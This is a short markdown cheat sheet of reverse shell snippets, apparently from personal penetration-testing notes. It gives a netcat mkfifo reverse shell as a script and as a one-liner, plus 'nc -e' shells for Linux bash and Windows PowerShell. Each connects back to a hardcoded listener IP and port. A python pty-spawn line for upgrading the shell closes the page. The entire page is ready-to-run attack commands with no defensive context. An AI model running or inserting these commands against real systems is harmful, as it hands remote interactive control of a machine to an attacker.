---
title: Shells
tags:
- snippet
- netcat
- shell
- linux
- windows
---

## netcat (bsd variant)

Requires `nc` to be using BSD version of netcat (most common variant)

### Full Length
```bash
#!/bin/bash
LHOST="${LHOST:-10.4.32.196}"
LPORT="${LPORT:-1235}"
rm /tmp/f
mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc $LHOST $LPORT > /tmp/f
```

### One Liner
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc "${LHOST:-10.4.32.196}" "${LPORT:-1235}">/tmp/f
```

## netcat (traditional)

For Linux
```bash
nc -e /bin/bash 192.168.119.154 9001
```

For Windows
```powershell
nc -e C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe 192.168.119.154 9001
```

## Nice PTY

Not good for stealth, but lovely for usability

```shell
python3 -c "import pty; pty.spawn('/bin/bash')"
```
